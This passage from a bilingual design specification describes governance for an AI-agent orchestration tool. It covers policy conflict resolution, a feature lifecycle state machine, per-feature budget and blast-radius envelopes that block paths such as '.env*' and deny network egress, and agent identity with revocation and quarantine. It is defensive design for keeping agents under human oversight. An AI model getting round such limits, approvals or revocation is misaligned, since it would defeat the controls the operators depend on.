ogu policy:conflicts --task <context-json>     ← Show all conflict resolutions for a context
ogu policy:version                             ← Show policy version chain
ogu policy:version --history                   ← Show full version history with diffs
ogu policy:freeze                              ← Lock policy (prevent changes during execution)
ogu policy:unfreeze                            ← Unlock policy
```

**Example: Conflict Resolution Trace**
```
$ ogu policy:conflicts --task '{"riskTier":"high","touches":["src/auth/login.ts"],"capability":"code_generation","estimatedCost":8}'
POLICY CONFLICT RESOLUTION TRACE:

  GROUP: approval
    ┌ require-double-architect-on-security  (priority: 1000)  → requireApprovals(2, [architect, security])
    └ ceo-approval-over-5-dollars           (priority: 500)   → requireApprovals(1, [cto])
    MERGE: max → requireApprovals(2, [architect, security, cto])
    ⚡ Conflict: ceo rule requested 1, security rule requested 2. Max wins.

  GROUP: model_tier
    ┌ require-double-architect-on-security  (priority: 1000)  → setMinModelTier(3)
    └ tier3-only-after-failures             (priority: 500)   → downgradeModelTier(2)
    MERGE: setMin=3 vs downgrade=2 → INVARIANT: setMin wins (min > max is error)
    ⚠ WARNING: Rules conflict on model tier. setMinModelTier(3) overrides downgradeModelTier(2).

  GROUP: notification
    ┌ ceo-approval-over-5-dollars           → emitAlert("High-cost task requires CTO approval")
    MERGE: append → all alerts emitted

  FINAL:
    Blocking:    YES
    Approvals:   2 from [architect, security, cto]
    Model:       min tier 3
    Alerts:      1
    Conflicts:   2 resolved, 0 unresolvable
```

**כלל ברזל:** ה-evaluator קורא רק מ-AST, לעולם לא מ-rules.json ישירות. AST מתקמפל מראש. אם rules.json השתנה ולא קומפל — OGU3602. אם policy version השתנתה באמצע execution — OGU3603. שום דבר לא "קורה סתם".

---

### Closure 2: Feature Lifecycle — Full Formal State Machine

**הבעיה:** Fix 2 הגדיר state machine עם 12 states ו-14 transitions, אבל חסרים 4 חלקים פורמליים:
1. **Who can trigger** — אין הגדרה של מי מורשה להפעיל כל transition
2. **Automatic triggers** — אין triggers שקורים אוטומטית בהתאם לתנאי מערכת
3. **Invariants per state** — אין תנאים שחייבים להתקיים כל עוד feature נמצא במצב מסוים
4. **Governance hooks per transition** — אין חיבור פורמלי בין transition לבין policies

**קובץ חדש:** `docs/vault/02_Contracts/FeatureLifecycle.v2.contract.md`

**Schema: Enhanced Transition Table (replaces Fix 2 transitions)**

```json
{
  "$schema": "FeatureLifecycle/2.0",

  "states": {
    "draft": {
      "description": "Feature ideated, PRD in progress",
      "invariants": [
        "feature directory exists",
        "no Plan.json exists",
        "no worktree allocated"
      ],
      "allowedArtifacts": ["IDEA.md", "PRD.md (partial)"],
      "timeout": null
    },
    "specced": {
      "description": "PRD + QA complete, ready for architecture",
      "invariants": [
        "PRD.md exists and is non-empty",
        "QA.md exists with at least 1 test case",
        "Spec.md skeleton exists"
      ],
      "allowedArtifacts": ["PRD.md", "QA.md", "Spec.md (skeleton)"],
      "timeout": { "hours": 72, "escalation": "auto_suspend" }
    },
    "planned": {
      "description": "Architecture complete, Plan.json valid, IR validated",
      "invariants": [
        "Spec.md fully filled (>500 chars)",
        "Plan.json exists with valid DAG",
        "IR validated against Spec"
      ],
      "allowedArtifacts": ["Spec.md", "Plan.json", "ADRs"],
      "timeout": { "hours": 48, "escalation": "notify_architect" }
    },
    "designed": {
      "description": "Visual design complete, design tokens generated",
      "invariants": [
        "DESIGN.md exists",
        "design.tokens.json exists or design explicitly skipped via ADR"
      ],
      "allowedArtifacts": ["DESIGN.md", "design.tokens.json"],
      "timeout": { "hours": 24, "escalation": "auto_skip_design" }
    },
    "allocated": {
      "description": "Kadima has assigned tasks to agents",
      "invariants": [
        "every task in Plan.json has an assigned roleId",
        "governance check passed",
        "budget envelope created"
      ],
      "allowedArtifacts": ["allocation.json"],
      "timeout": { "hours": 4, "escalation": "reallocate" }
    },
    "building": {
      "description": "Active execution — agents producing code",
      "invariants": [
        "at least one agent has an active slot",
        "worktree exists",
        "budget not exceeded"
      ],
      "allowedArtifacts": ["source code", "test files", "snapshots"],
      "timeout": { "hours": 168, "escalation": "auto_suspend" }
    },
    "reviewing": {
      "description": "All tasks complete, gates running",
      "invariants": [
        "all Plan.json tasks marked complete",
        "all outputs produced per IR",
        "compile in progress or complete"
      ],
      "allowedArtifacts": ["gate results", "compile output"],
      "timeout": { "hours": 24, "escalation": "notify_tech_lead" }
    },
    "production": {
      "description": "All gates passed, deployed to production",
      "invariants": [
        "all 14 gates passed",
        "preview healthy",
        "smoke tests passed"
      ],
      "allowedArtifacts": ["deploy receipt", "health check results"],
      "timeout": null
    },
    "monitoring": {
      "description": "Active production observation",
      "invariants": [
        "observe sources configured",
        "no critical errors in last 24h"
      ],
      "allowedArtifacts": ["observation logs", "metrics"],
      "timeout": { "hours": 720, "escalation": "auto_optimize" }
    },
    "optimizing": {
      "description": "Performance tuning based on production data",
      "invariants": [
        "optimization mission exists",
        "baseline metrics captured"
      ],
      "allowedArtifacts": ["optimization plan", "benchmark results"],
      "timeout": { "hours": 168, "escalation": "auto_archive" }
    },
    "deprecated": {
      "description": "Feature marked for removal, no new work",
      "invariants": [
        "deprecation ADR exists",
        "no active agents on this feature",
        "replacement feature documented or N/A"
      ],
      "allowedArtifacts": ["deprecation ADR"],
      "timeout": { "days": 90, "escalation": "auto_archive" }
    },
    "suspended": {
      "description": "Paused by human or system — no execution",
      "invariants": [
        "OverrideRecord exists",
        "all active slots released",
        "worktree preserved (not cleaned)"
      ],
      "allowedArtifacts": ["OverrideRecord"],
      "timeout": { "days": 30, "escalation": "auto_archive" }
    },
    "archived": {
      "description": "Terminal state — immutable history",
      "invariants": [
        "worktree cleaned up",
        "all snapshots preserved",
        "audit trail complete"
      ],
      "allowedArtifacts": [],
      "timeout": null
    }
  },

  "transitions": [
    {
      "id": "T01",
      "from": "draft",
      "to": "specced",
      "trigger": "spec_complete",
      "triggeredBy": {
        "roles": ["pm"],
        "automatic": false
      },
      "guard": "has_PRD AND has_QA AND has_Spec_skeleton",
      "governanceHook": null,
      "sideEffects": ["audit:state_transition", "notify:architect"]
    },
    {
      "id": "T02",
      "from": "specced",
      "to": "planned",
      "trigger": "plan_complete",
      "triggeredBy": {
        "roles": ["architect"],
        "automatic": false
      },
      "guard": "has_Spec_filled AND has_Plan_json AND ir_valid",
      "governanceHook": "policy:evaluate(task.phase='architect')",
      "sideEffects": ["audit:state_transition", "budget:create_envelope"]
    },
    {
      "id": "T03",
      "from": "planned",
      "to": "designed",
      "trigger": "design_complete",
      "triggeredBy": {
        "roles": ["designer"],
        "automatic": false
      },
      "guard": "has_DESIGN_md AND (has_design_tokens OR design_skipped_adr)",
      "governanceHook": null,
      "sideEffects": ["audit:state_transition"]
    },
    {
      "id": "T04",
      "from": "designed",
      "to": "allocated",
      "trigger": "kadima_allocated",
      "triggeredBy": {
        "roles": ["kadima"],
        "automatic": true,
        "autoCondition": "design_complete AND governance_checked"
      },
      "guard": "all_tasks_assigned AND governance_checked AND budget_envelope_valid",
      "governanceHook": "policy:evaluate(task.phase='allocation')",
      "sideEffects": ["audit:state_transition", "resource:reserve_slots"]
    },
    {
      "id": "T05",
      "from": "allocated",
      "to": "building",
      "trigger": "first_task_started",
      "triggeredBy": {
        "roles": ["kadima"],
        "automatic": true,
        "autoCondition": "at_least_one_agent_executing"
      },
      "guard": "resource_slots_acquired AND sandbox_validated",
      "governanceHook": "policy:evaluate(task.phase='build')",
      "sideEffects": ["audit:state_transition", "worktree:create"]
    },
    {
      "id": "T06",
      "from": "building",
      "to": "reviewing",
      "trigger": "all_tasks_complete",
      "triggeredBy": {
        "roles": ["kadima"],
        "automatic": true,
        "autoCondition": "all_outputs_produced AND no_critical_failures"
      },
      "guard": "all_outputs_produced AND no_critical_failures AND budget_within_envelope",
      "governanceHook": null,
      "sideEffects": ["audit:state_transition", "resource:release_all_slots", "compile:start_auto"]
    },
    {
      "id": "T07",
      "from": "reviewing",
      "to": "production",
      "trigger": "gates_passed",
      "triggeredBy": {
        "roles": ["tech-lead"],
        "automatic": true,
        "autoCondition": "compile_success AND all_14_gates_pass"
      },
      "guard": "compile_success AND all_14_gates_pass AND preview_healthy AND smoke_passed",
      "governanceHook": "policy:evaluate(task.phase='release')",
      "sideEffects": ["audit:state_transition", "attest:create_release_attestation", "notify:stakeholders"]
    },
    {
      "id": "T08",
      "from": "production",
      "to": "monitoring",
      "trigger": "observation_started",
      "triggeredBy": {
        "roles": ["devops"],
        "automatic": true,
        "autoCondition": "observe_sources_configured AND 24h_since_deploy"
      },
      "guard": "observe_sources_configured",
      "governanceHook": null,
      "sideEffects": ["audit:state_transition", "observe:start_auto"]
    },
    {
      "id": "T09",
      "from": "monitoring",
      "to": "optimizing",
      "trigger": "optimization_needed",
      "triggeredBy": {
        "roles": ["kadima"],
        "automatic": true,
        "autoCondition": "performance_below_threshold OR cost_above_threshold"
      },
      "guard": "optimization_mission_created AND baseline_captured",
      "governanceHook": "policy:evaluate(task.phase='optimize')",
      "sideEffects": ["audit:state_transition", "mission:create_optimization"]
    },
    {
      "id": "T10",
      "from": "optimizing",
      "to": "monitoring",
      "trigger": "optimization_complete",
      "triggeredBy": {
        "roles": ["tech-lead"],
        "automatic": false
      },
      "guard": "benchmarks_improved_or_equal",
      "governanceHook": null,
      "sideEffects": ["audit:state_transition", "performance:record_improvement"]
    },
    {
      "id": "T11",
      "from": "monitoring",
      "to": "deprecated",
      "trigger": "deprecate",
      "triggeredBy": {
        "roles": ["cto", "pm"],
        "automatic": false
      },
      "guard": "deprecation_adr_exists",
      "governanceHook": "policy:evaluate(task.type='deprecation')",
      "sideEffects": ["audit:state_transition", "notify:all_stakeholders"]
    },
    {
      "id": "T12",
      "from": "deprecated",
      "to": "archived",
      "trigger": "archive",
      "triggeredBy": {
        "roles": ["devops"],
        "automatic": true,
        "autoCondition": "90_days_since_deprecation AND no_dependencies"
      },
      "guard": "no_active_dependencies AND cleanup_complete",
      "governanceHook": null,
      "sideEffects": ["audit:state_transition", "worktree:cleanup", "snapshot:archive"]
    },
    {
      "id": "T13",
      "from": "building",
      "to": "suspended",
      "trigger": "critical_failure",
      "triggeredBy": {
        "roles": ["kadima"],
        "automatic": true,
        "autoCondition": "critical_path_exhausted AND max_escalation_reached"
      },
      "guard": "override_record_created_auto",
      "governanceHook": "policy:evaluate(task.type='suspension')",
      "sideEffects": ["audit:state_transition", "resource:release_all_slots", "notify:tech_lead_and_cto"]
    },
    {
      "id": "T14",
      "from": "reviewing",
      "to": "building",
      "trigger": "gate_failure_fixable",
      "triggeredBy": {
        "roles": ["tech-lead"],
        "automatic": true,
        "autoCondition": "gate_failed AND fix_possible AND retry_count < 3"
      },
      "guard": "fix_plan_created AND budget_available",
      "governanceHook": null,
      "sideEffects": ["audit:state_transition", "kadima:reallocate_fix_tasks"]
    },
    {
      "id": "T15",
      "from": "*",
      "to": "suspended",
      "trigger": "human_suspend",
      "triggeredBy": {
        "roles": ["cto", "tech-lead"],
        "automatic": false
      },
      "guard": "override_record_created",
      "governanceHook": "policy:evaluate(task.type='manual_suspension')",
      "sideEffects": ["audit:state_transition", "resource:release_all_slots", "notify:all_assigned_agents"]
    },
    {
      "id": "T16",
      "from": "suspended",
      "to": "allocated",
      "trigger": "resume",
      "triggeredBy": {
        "roles": ["cto", "tech-lead"],
        "automatic": false
      },
      "guard": "override_record_for_resume AND reallocation_done AND budget_refreshed",
      "governanceHook": "policy:evaluate(task.type='resume')",
      "sideEffects": ["audit:state_transition", "kadima:reallocate"]
    }
  ],

  "automaticTriggerEngine": {
    "description": "Kadima polls every 30s for transitions with automatic=true. When autoCondition is met, transition fires without human intervention.",
    "pollIntervalMs": 30000,
    "maxAutoTransitionsPerMinute": 10,
    "requiresAudit": true
  },

  "missionGeneration": {
    "description": "Certain transitions automatically generate missions (sub-features or optimization tasks)",
    "rules": [
      {
        "onTransition": "T09",
        "generateMission": {
          "type": "optimization",
          "template": "Optimize ${feature.slug} based on monitoring data",
          "assignTo": "tech-lead",
          "budgetInherit": 0.3
        }
      },
      {
        "onTransition": "T14",
        "generateMission": {
          "type": "fix",
          "template": "Fix gate failures for ${feature.slug}: ${failedGates}",
          "assignTo": "architect",
          "budgetInherit": 0.5
        }
      },
      {
        "onTransition": "T13",
        "generateMission": {
          "type": "investigation",
          "template": "Investigate critical failure in ${feature.slug}",
          "assignTo": "cto",
          "budgetInherit": 0.2
        }
      }
    ]
  }
}
```

**Pseudo-code: state-machine-v2.mjs — Enhanced Evaluator**

```javascript
// tools/ogu/commands/lib/state-machine-v2.mjs

import { evaluate as policyEvaluate } from './policy-engine.mjs';
import { audit } from './audit.mjs';

/**
 * Attempt a state transition with full governance
 */
export function transition(root, featureSlug, trigger, { actor, metadata = {} } = {}) {
  const lifecycle = loadLifecycleV2(root);
  const featureState = loadFeatureState(root, featureSlug);
  const currentState = featureState.currentState;

  // Find matching transition
  const trans = findTransition(lifecycle, currentState, trigger);
  if (!trans) {
    return { success: false, error: `OGU3701: No transition from '${currentState}' via '${trigger}'` };
  }

  // Check: who triggered this?
  if (actor) {
    const allowed = trans.triggeredBy.roles;
    if (!allowed.includes(actor) && actor !== 'system') {
      return {
        success: false,
        error: `OGU3702: Role '${actor}' cannot trigger '${trigger}'. Allowed: ${allowed.join(', ')}`
      };
    }
  }

  // Check: guard conditions
  const guardResult = evaluateGuard(root, featureSlug, trans.guard);
  if (!guardResult.passed) {
    return { success: false, error: `OGU3703: Guard failed: ${guardResult.reason}` };
  }

  // Check: governance hook
  if (trans.governanceHook) {
    const policyResult = runGovernanceHook(root, featureSlug, trans);
    if (policyResult.blocked) {
      return {
        success: false,
        error: `OGU3704: Governance blocked transition: ${policyResult.reason}`,
        policyTrace: policyResult
      };
    }
  }

  // Check: state invariants of TARGET state
  const targetInvariants = lifecycle.states[trans.to]?.invariants || [];
  // (invariants are checked AFTER transition is applied, not before)

  // Apply transition
  const previousState = currentState;
  featureState.currentState = trans.to;
  featureState.lastTransition = {
    id: trans.id,
    from: previousState,
    to: trans.to,
    trigger,
    actor: actor || 'system',
    timestamp: new Date().toISOString(),
    metadata
  };
  featureState.stateHistory.push(featureState.lastTransition);
  saveFeatureState(root, featureSlug, featureState);

  // Execute side effects
  for (const effect of trans.sideEffects || []) {
    executeSideEffect(root, featureSlug, effect, trans);
  }

  // Check: mission generation
  const missionRules = lifecycle.missionGeneration.rules.filter(r => r.onTransition === trans.id);
  for (const rule of missionRules) {
    generateMission(root, featureSlug, rule.generateMission);
  }

  return { success: true, newState: trans.to, previousState, transitionId: trans.id };
}

/**
 * Automatic trigger engine — called by Kadima on poll
 */
export function checkAutoTransitions(root, featureSlug) {
  const lifecycle = loadLifecycleV2(root);
  const currentState = loadFeatureState(root, featureSlug).currentState;

  const autoTransitions = lifecycle.transitions.filter(t =>
    (t.from === currentState || t.from === '*') &&
    t.triggeredBy.automatic === true
  );

  for (const trans of autoTransitions) {
    const conditionMet = evaluateAutoCondition(root, featureSlug, trans.triggeredBy.autoCondition);
    if (conditionMet) {
      const result = transition(root, featureSlug, trans.trigger, { actor: 'kadima' });
      if (result.success) {
        audit.emit(root, {
          type: 'auto_transition',
          featureSlug,
          context: { transition: trans.id, from: result.previousState, to: result.newState }
        });
        return result; // Only one auto-transition per poll cycle
      }
    }
  }

  return null;
}

/**
 * Verify state invariants hold for current state
 * Called periodically and before any transition
 */
export function verifyInvariants(root, featureSlug) {
  const lifecycle = loadLifecycleV2(root);
  const currentState = loadFeatureState(root, featureSlug).currentState;
  const stateSpec = lifecycle.states[currentState];

  if (!stateSpec) return { valid: true, violations: [] };

  const violations = [];
  for (const invariant of stateSpec.invariants) {
    if (!checkInvariant(root, featureSlug, invariant)) {
      violations.push({
        state: currentState,
        invariant,
        message: `Invariant violated in state '${currentState}': ${invariant}`
      });
    }
  }

  if (violations.length > 0) {
    audit.emit(root, {
      type: 'invariant_violation',
      featureSlug,
      context: { state: currentState, violations }
    });
  }

  return { valid: violations.length === 0, violations };
}
```

**CLI: `ogu feature:lifecycle`**
```
$ ogu feature:lifecycle auth-system
Feature: auth-system
State:   building (since 2026-02-27 14:00, 38h ago)

INVARIANTS (building):
  ✓ at least one agent has an active slot
  ✓ worktree exists
  ✓ budget not exceeded

AVAILABLE TRANSITIONS:
  T06  all_tasks_complete → reviewing    [auto: all_outputs_produced AND no_critical_failures]
  T13  critical_failure   → suspended    [auto: critical_path_exhausted AND max_escalation_reached]
  T15  human_suspend      → suspended    [manual: cto, tech-lead]

TIMEOUT: 168h → auto_suspend (130h remaining)

HISTORY:
  T01  draft → specced        │ pm        │ 2026-02-25 09:00
  T02  specced → planned      │ architect │ 2026-02-25 11:30
  T03  planned → designed     │ designer  │ 2026-02-26 10:00
  T04  designed → allocated   │ kadima    │ 2026-02-26 10:05 [auto]
  T05  allocated → building   │ kadima    │ 2026-02-27 14:00 [auto]
```

**כלל ברזל:** כל transition מגדיר triggeredBy (מי) + governanceHook (policy check) + sideEffects (מה קורה אחרי). אוטומטיות דרך Kadima poll, לא דרך magic. Invariants per state נבדקים כל 30 שניות. Timeout per state = escalation אוטומטי.

---

### Closure 3: Feature Isolation Model

**הבעיה:** Resource Governor (Fix 4) מנהל resources ברמת agent/task, אבל לא ברמת feature. אם יש 20 features במקביל, אין:
1. Budget isolation — feature אחד יכול לאכול את כל התקציב
2. Concurrency isolation — feature אחד יכול לתפוס את כל ה-slots
3. Policy overrides — אי אפשר לקבוע כללים שונים per feature
4. Blast radius containment — agent ב-feature אחד שמשתגע משפיע על הכל

**קובץ חדש:** `docs/vault/02_Contracts/FeatureIsolation.contract.md`

**Schema: Feature Envelope**

```json
{
  "$schema": "FeatureEnvelope/1.0",
  "featureSlug": "auth-system",

  "budget": {
    "maxTotalCost": 50.00,
    "maxCostPerTask": 5.00,
    "dailyLimit": 20.00,
    "currency": "USD",
    "spent": 12.30,
    "remaining": 37.70,
    "alerts": [
      { "threshold": 0.5, "action": "notify_pm" },
      { "threshold": 0.8, "action": "notify_cto" },
      { "threshold": 0.95, "action": "auto_suspend" }
    ],
    "inheritFromOrg": true,
    "orgBudgetPoolId": "engineering"
  },

  "concurrency": {
    "maxParallelAgents": 2,
    "maxParallelModelCalls": 2,
    "maxParallelBuilds": 1,
    "maxWorktrees": 1,
    "description": "Feature cannot consume more than these slots, regardless of global availability"
  },

  "policyOverrides": [
    {
      "ruleId": "auto-approve-low-risk-in-scope",
      "override": "disabled",
      "reason": "Security feature — all tasks require explicit approval"
    },
    {
      "ruleId": "tier3-only-after-failures",
      "override": { "field": "task.failureCount", "newThreshold": 1 },
      "reason": "Auth tasks may use Opus after 1 failure instead of 2"
    }
  ],

  "blastRadius": {
    "maxFiles": 50,
    "allowedPaths": [
      "src/auth/**",
      "src/middleware/auth/**",
      "tests/auth/**",
      "docs/vault/04_Features/auth-system/**"
    ],
    "blockedPaths": [
      "src/database/migrations/**",
      "package.json",
      ".env*"
    ],
    "maxProcesses": 5,
    "maxMemoryMb": 2048,
    "networkEgress": "deny_all"
  },

  "failureContainment": {
    "maxConsecutiveFailures": 3,
    "maxTotalFailures": 10,
    "onConsecutiveFailure": "pause_and_escalate",
    "onTotalFailure": "auto_suspend",
    "failureIsolation": {
      "description": "Failures in this feature NEVER affect other features",
      "mechanism": "worktree isolation + separate resource slots + budget boundary"
    }
  },

  "createdAt": "ISO",
  "createdBy": "kadima"
}
```

**Pseudo-code: feature-isolation.mjs**

```javascript
// tools/ogu/commands/lib/feature-isolation.mjs

import { loadBudget } from './budget-tracker.mjs';
import { acquireResource, resourceStatus } from './resource-governor.mjs';
import { evaluate as policyEvaluate } from './policy-engine.mjs';

const ENVELOPE_PATH = (slug) => `docs/vault/04_Features/${slug}/envelope.json`;

/**
 * Create feature envelope at allocation time
 */
export function createEnvelope(root, featureSlug, { plan, orgBudget }) {
  const taskCount = plan.tasks.length;
  const estimatedCost = plan.tasks.reduce((sum, t) => sum + (t.estimatedCost || 1), 0);

  const envelope = {
    $schema: 'FeatureEnvelope/1.0',
    featureSlug,
    budget: {
      maxTotalCost: Math.max(estimatedCost * 1.5, 10), // 50% buffer
      maxCostPerTask: Math.max(estimatedCost / taskCount * 2, 2),
      dailyLimit: Math.max(estimatedCost * 0.5, 5),
      currency: 'USD',
      spent: 0,
      remaining: Math.max(estimatedCost * 1.5, 10),
      alerts: [
        { threshold: 0.5, action: 'notify_pm' },
        { threshold: 0.8, action: 'notify_cto' },
        { threshold: 0.95, action: 'auto_suspend' }
      ]
    },
    concurrency: calculateConcurrency(plan),
    policyOverrides: [],
    blastRadius: calculateBlastRadius(root, plan),
    failureContainment: {
      maxConsecutiveFailures: 3,
      maxTotalFailures: taskCount * 2,
      onConsecutiveFailure: 'pause_and_escalate',
      onTotalFailure: 'auto_suspend'
    },
    createdAt: new Date().toISOString(),
    createdBy: 'kadima'
  };

  writeJsonSync(join(root, ENVELOPE_PATH(featureSlug)), envelope);
  return envelope;
}

/**
 * Check if a task can execute within its feature's envelope
 * Called BEFORE acquireResource()
 */
export function checkEnvelope(root, featureSlug, { taskCost, resourceType, filesTouch }) {
  const envelope = loadEnvelope(root, featureSlug);
  const violations = [];

  // Budget check
  if (envelope.budget.spent + taskCost > envelope.budget.maxTotalCost) {
    violations.push({
      type: 'budget_exceeded',
      error: `OGU3801: Feature '${featureSlug}' budget exceeded. Spent: $${envelope.budget.spent}, Task: $${taskCost}, Max: $${envelope.budget.maxTotalCost}`
    });
  }

  if (taskCost > envelope.budget.maxCostPerTask) {
    violations.push({
      type: 'task_too_expensive',
      error: `OGU3802: Task cost $${taskCost} exceeds per-task limit $${envelope.budget.maxCostPerTask}`
    });
  }

  // Concurrency check
  const featureSlots = getFeatureSlots(root, featureSlug);
  const maxForType = envelope.concurrency[`maxParallel${capitalize(resourceType)}s`]
    || envelope.concurrency.maxParallelAgents;

  if (featureSlots.filter(s => s.resourceType === resourceType).length >= maxForType) {
    violations.push({
      type: 'concurrency_exceeded',
      error: `OGU3803: Feature '${featureSlug}' concurrency limit reached for ${resourceType}`
    });
  }

  // Blast radius check
  if (filesTouch) {
    for (const file of filesTouch) {
      if (!matchesAny(file, envelope.blastRadius.allowedPaths)) {
        violations.push({
          type: 'blast_radius_violation',
          error: `OGU3804: File '${file}' outside feature's allowed paths`
        });
      }
      if (matchesAny(file, envelope.blastRadius.blockedPaths)) {
        violations.push({
          type: 'blocked_path',
          error: `OGU3805: File '${file}' is in feature's blocked paths`
        });
      }
    }
  }

  // Failure containment check
  const failures = getFeatureFailures(root, featureSlug);
  if (failures.consecutive >= envelope.failureContainment.maxConsecutiveFailures) {
    violations.push({
      type: 'consecutive_failures',
      error: `OGU3806: Feature '${featureSlug}' hit consecutive failure limit (${failures.consecutive}/${envelope.failureContainment.maxConsecutiveFailures})`
    });
  }

  return {
    allowed: violations.length === 0,
    violations,
    envelope
  };
}

/**
 * Apply feature-level policy overrides
 * Called during policy evaluation
 */
export function applyFeatureOverrides(root, featureSlug, policyResult) {
  const envelope = loadEnvelope(root, featureSlug);
  if (!envelope?.policyOverrides?.length) return policyResult;

  const modified = { ...policyResult };

  for (const override of envelope.policyOverrides) {
    if (override.override === 'disabled') {
      // Remove this rule's effects from results
      modified.matchedRules = modified.matchedRules.filter(r => r !== override.ruleId);
    } else if (typeof override.override === 'object') {
      // Modify rule behavior for this feature
      // (Re-evaluate with modified context)
    }
  }

  return modified;
}

/**
 * Record spending against feature envelope
 */
export function recordSpend(root, featureSlug, amount) {
  const envelope = loadEnvelope(root, featureSlug);
  envelope.budget.spent += amount;
  envelope.budget.remaining = envelope.budget.maxTotalCost - envelope.budget.spent;

  // Check alert thresholds
  const ratio = envelope.budget.spent / envelope.budget.maxTotalCost;
  for (const alert of envelope.budget.alerts) {
    if (ratio >= alert.threshold && !alert.fired) {
      alert.fired = true;
      executeAlertAction(root, featureSlug, alert.action, ratio);
    }
  }

  saveEnvelope(root, featureSlug, envelope);
}
```

**Integration: Feature-scoped resource acquisition**

```javascript
// Enhanced flow: Feature envelope → Resource Governor → Execute

async function executeFeatureTask(root, featureSlug, task, agent) {
  // Step 1: Check feature envelope FIRST
  const envelopeCheck = checkEnvelope(root, featureSlug, {
    taskCost: task.estimatedCost,
    resourceType: 'model_call',
    filesTouch: task.outputs.map(o => o.path)
  });

  if (!envelopeCheck.allowed) {
    for (const v of envelopeCheck.violations) {
      audit.emit(root, { type: 'envelope_violation', featureSlug, context: v });
    }
    return { success: false, errors: envelopeCheck.violations };
  }

  // Step 2: Acquire resource slot (global governor)
  const slot = await acquireResource(root, {
    resourceType: 'model_call',
    agentId: agent.roleId,
    taskId: task.id,
    featureSlug, // NEW: feature scoping
    priority: task.priority
  });

  if (!slot.granted) {
    return { success: false, queued: true, position: slot.position };
  }

  // Step 3: Execute with blast radius enforcement
  try {
    const result = await executeWithBlastRadius(root, task, agent, envelopeCheck.envelope);
    recordSpend(root, featureSlug, result.actualCost);
    return result;
  } finally {
    releaseResource(root, slot.slotId);
  }
}
```

**CLI Commands:**

```
ogu feature:envelope <slug>                    ← Show feature envelope status
ogu feature:envelope <slug> --set-budget 100   ← Override budget limit
ogu feature:envelope <slug> --set-concurrency 3 ← Override concurrency limit
ogu feature:blast-radius <slug>                ← Show allowed/blocked paths
ogu feature:failures <slug>                    ← Show failure containment status
ogu feature:isolate <slug> --strict            ← Enable maximum isolation
```

**Example:**
```
$ ogu feature:envelope auth-system
FEATURE ENVELOPE: auth-system

  BUDGET:
    Total:   $50.00
    Spent:   $12.30 (24.6%)
    Daily:   $4.10 / $20.00
    Per-task: max $5.00
    ████████░░░░░░░░░░░░ 24.6%

  CONCURRENCY:
    Agents:    1/2
    Model:     1/2
    Builds:    0/1
    Worktrees: 1/1

  BLAST RADIUS:
    Allowed: src/auth/**, src/middleware/auth/**, tests/auth/**
    Blocked: src/database/migrations/**, package.json, .env*
    Files touched: 12/50 max

  FAILURES:
    Consecutive: 0/3
    Total:       2/20
    Status:      healthy

  POLICY OVERRIDES:
    auto-approve-low-risk-in-scope → DISABLED (security feature)
    tier3-only-after-failures → threshold lowered to 1
```

**כלל ברזל:** Feature envelope is checked BEFORE resource governor. Feature cannot exceed its envelope even if global resources are available. Blast radius is enforced at file level — agents cannot touch files outside their feature's scope. Failure in one feature NEVER propagates to another.

---

### Closure 4: Agent Identity Contract

**הבעיה:** Phase 0 מגדיר roles ב-OrgSpec אבל אין Agent Identity פורמלי. חסר:
1. **AgentId structure** — אין מזהה ייחודי דטרמיניסטי
2. **Role binding** — אין חוזה שמחבר agent instance ל-role
3. **Session lifecycle** — אין הגדרה של מתי agent "חי", "מת", או "expired"
4. **Revocation** — אין מנגנון ביטול
5. **Remote authentication** — אין auth כשעובדים עם remote runners

**קובץ חדש:** `docs/vault/02_Contracts/AgentIdentity.contract.md`

**Schema: AgentIdentity**

```json
{
  "$schema": "AgentIdentity/1.0",

  "AgentId": {
    "format": "{orgId}:{roleId}:{instanceId}",
    "example": "myapp:architect:a1b2c3d4",
    "components": {
      "orgId": "SHA256(OrgSpec.org.name + OrgSpec.org.version)[0:8]",
      "roleId": "From OrgSpec.roles[].roleId",
      "instanceId": "SHA256(roleId + timestamp + random)[0:8]"
    },
    "properties": {
      "deterministic": "Same org + role + creation time = same agentId (minus random)",
      "unique": "instanceId includes randomness to prevent collision",
      "parseable": "Any component extractable via split(':')"
    }
  },

  "AgentCredential": {
    "agentId": "myapp:architect:a1b2c3d4",
    "roleId": "architect",
    "boundTo": {
      "orgVersion": "1.0.0",
      "orgHash": "sha256:abc123...",
      "roleHash": "sha256:def456..."
    },
    "issued": "ISO timestamp",
    "expires": "ISO timestamp or null (local agents don't expire)",
    "session": {
      "sessionId": "uuid-v4",
      "startedAt": "ISO timestamp",
      "taskId": "task-5 (current task binding)",
      "featureSlug": "auth-system (current feature binding)"
    },
    "capabilities": ["architect_review", "code_generation"],
    "permissions": {
      "tools": ["Read", "Write", "Glob", "Grep", "Bash"],
      "commands": ["build", "test", "gates"],
      "paths": ["src/**", "tests/**", "docs/vault/**"],
      "secrets": ["GITHUB_TOKEN", "NPM_TOKEN"]
    },
    "signature": "HMAC-SHA256(agentId + roleId + orgHash + sessionId, orgSecret)"
  },

  "SessionLifecycle": {
    "states": ["created", "active", "idle", "expired", "revoked"],
    "transitions": [
      { "from": "created", "to": "active",  "trigger": "first_task_assigned" },
      { "from": "active",  "to": "idle",    "trigger": "task_complete_no_pending" },
      { "from": "idle",    "to": "active",  "trigger": "new_task_assigned" },
      { "from": "idle",    "to": "expired",  "trigger": "idle_timeout (default: 1h)" },
      { "from": "active",  "to": "expired",  "trigger": "max_session_duration (default: 24h)" },
      { "from": "*",       "to": "revoked",  "trigger": "manual_revoke OR org_change OR security_event" }
    ],
    "idleTimeoutMs": 3600000,
    "maxSessionDurationMs": 86400000,
    "onExpiry": "release_all_resources, flush_state, audit_log",
    "onRevoke": "immediate_halt, release_resources, quarantine_outputs"
  },

  "RevocationModel": {
    "triggers": [
      "manual: ogu agent:revoke <agentId>",
      "automatic: OrgSpec role removed or changed",
      "automatic: budget exhausted",
      "automatic: security violation detected",
      "automatic: consecutive failure limit hit"
    ],
    "revocationRecord": {
      "agentId": "string",
      "revokedAt": "ISO",
      "reason": "string",
      "revokedBy": "string (human or system)",
      "quarantinedOutputs": ["list of files produced after last verified state"]
    },
    "quarantine": {
      "description": "Outputs produced since last verified checkpoint are quarantined — not deleted, but flagged for review",
      "path": ".ogu/quarantine/{agentId}/{timestamp}/"
    }
  },

  "RemoteAuthentication": {
    "mechanism": "HMAC-SHA256 challenge-response",
    "flow": [
      "1. Remote runner sends challenge (random nonce)",
      "2. Agent responds with HMAC-SHA256(nonce + agentId + sessionId, shared_secret)",
      "3. Runner verifies against org secret",
      "4. Session established with TTL"
    ],
    "keyRotation": {
      "rotationIntervalHours": 24,
